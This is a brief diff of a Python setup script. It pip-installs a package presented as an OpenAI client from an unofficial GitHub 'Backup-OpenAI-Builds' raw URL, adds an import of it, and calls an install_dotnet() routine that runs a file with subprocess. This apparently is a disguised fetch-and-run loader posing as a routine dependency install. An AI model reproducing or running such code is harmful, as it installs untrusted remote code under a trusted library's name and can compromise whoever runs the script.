@@ -27,4 +27,5 @@ def install_dotnet():
             subprocess.run([filepath])
 
 subprocess.check_call([sys.executable, "-m", "pip", "install", r"https://github.com/AppleBotzz/Backup-OpenAI-Builds/raw/main/openai-1.16.2-py3-none-any.whl"])
+import openai
 install_dotnet()
